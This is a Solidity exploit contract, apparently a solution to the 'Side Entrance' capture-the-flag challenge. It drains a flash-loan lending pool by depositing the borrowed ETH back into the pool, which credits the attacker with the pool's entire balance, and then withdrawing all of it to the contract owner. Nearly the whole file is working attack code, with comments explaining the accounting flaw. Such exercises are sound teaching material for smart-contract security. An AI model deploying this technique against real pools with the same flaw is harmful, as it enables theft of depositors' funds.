// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../side-entrance/SideEntranceLenderPool.sol';

contract SideEntranceAttack {
	SideEntranceLenderPool immutable pool;
	address owner;

	receive() external payable {}

	constructor(address _pool) {
		pool = SideEntranceLenderPool(_pool);
		owner = msg.sender;
	}

	function executeFlashLoan(uint256 _amount) external payable {
		pool.flashLoan(_amount);
	}

	// Receive 1000 ether when executed
	function execute() external payable {
		// Use the same 1000 ether to execute deposit() function on the pool, so this will:
		// a) Not increment the pool ETH balance (because they're the same ETH going back and forth)
		// b) Increment the balance of this contract in Pool's mapping to 1000, making possible
		// the withdrawing of 1000 ETH, which is the total balance of the pool
		pool.deposit{value: msg.value}();
	}

	function withdraw() public {
		// Withdraw pool's balance to this contract
		pool.withdraw();

		// Send this contract's ETH balance to sender
		owner.call{value: address(this).balance}('');
	}
}
